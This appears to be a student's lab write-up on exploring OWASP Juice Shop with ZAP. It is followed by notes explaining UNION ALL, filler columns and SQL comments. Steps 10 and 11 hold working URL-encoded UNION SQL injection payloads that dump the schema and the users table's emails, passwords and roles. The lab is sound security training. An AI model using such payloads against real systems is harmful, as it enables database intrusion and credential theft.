# Lab 002 - Manual Explore

## Objective

Learn how to perform an Manual Explore using ZAProxy against
OWASP Juice Shop.

## Environment

Target:
http://localhost:3000

Scanner:
ZAP

Date:
2026-09-28

## Steps Performed

1. Started Juice Shop
2. Started ZAP
3. Opened Manual Explore
4. Entered target URL
5. Enabled Manual Explore
6. Logged in to OWASP juice-shop as a user
7. Started exploring the site to build site tree within ZAP
8. Choose a site from the API site tree and attack with ZAP. Focus especially on backend APIs (API / REST endpoints). 
9. High Severity alert - SQL Injection was rised for the url: http://localhost:3000/rest/products/search?q=%27%28
10. Preparing exploit SQL query + Encoding with ZAProxy builtin tool for encoding: http://localhost:3000/rest/products/search?q=juice%25%27+AND+1%3C%3E1%29%29+UNION+ALL+SELECT+type%2C+name%2C+tbl_name%2C+rootpage%2C+sql%2C+7%2C+8%2C+9+%2C+10+FROM+sqlite_master--
11. Adjusted the query to retrieve user details from users table: http://localhost:3000/rest/products/search?q=juice%25%27+AND+1%3C%3E1%29%29+UNION+ALL+SELECT+id%2C+username%2C+email%2C+password%2C+role%2C+7%2C+8%2C+9+%2C+10+FROM+users--
    
## ZAP Components Used

- Manual Explore
- Attack
- Alerts

## Observations

- ZAP built site tree following my manual exploring.
- Attack was later triggered by me manually against specific sites (right click -> Attack).
- Multiple alerts from various severities (from High to Informational) appeared.

## Challenges

- Understanding what actions I need to perform: enabling manual explore, log in as user, explore the site what resulted in site tree cration, attack chosen sites

## Lessons Learned
- persisting the session to be able continue on it the next day
- performing required sequence of actions: enabling manual explore, log in as user, explore the site what resulted in site tree cration, attack chosen sites
# SQL Concepts Clarified

## UNION ALL

### What It Does

`UNION ALL` combines the results of two queries by stacking their rows together.

Example:

```text
Table A
---------
Row 1
Row 2

UNION ALL

Table B
---------
Row 3
Row 4
```

Result:

```text
Row 1
Row 2
Row 3
Row 4
```

### Important Rule

Both queries used with `UNION ALL` must return:

- The same number of columns
- Compatible column data types/structure

Otherwise, the database will return an error.

---

## Why Numbers Were Used in Some SELECT Columns

Example:

```sql
SELECT username, email, 7, 8, 9, 10
```

The values:

```text
7
8
9
10
```

are **literal values**, not table columns.

### Purpose

They are commonly used as:

- Placeholders
- Filler values
- A way to make the number of returned columns match another query (e.g., when using `UNION ALL`)

Example:

```sql
SELECT username, email, 7, 8, 9, 10
UNION ALL
SELECT name, address, phone, city, country, zip
```

Both queries return six columns, so the `UNION ALL` operation is valid.

### Key Point

Numeric literals such as:

```sql
7, 8, 9, 10
```

are simply constant values returned in every row of the result set.

---

## SQL Comments

### Single-Line Comment

Two dashes start a comment:

```sql
--
```

Everything after `--` on the same line is ignored by the SQL engine.

Example:

```sql
SELECT * FROM Users -- Return all users
```

The database executes:

```sql
SELECT * FROM Users
```

and ignores:

```sql
-- Return all users
```

### Common Uses

- Explaining queries
- Temporarily disabling parts of a query
- Improving readability during testing and troubleshooting

Example:

```sql
SELECT username,
       email
--     password
FROM Users;
```

In this example, the `password` column is commented out and will not be included in the query.

---


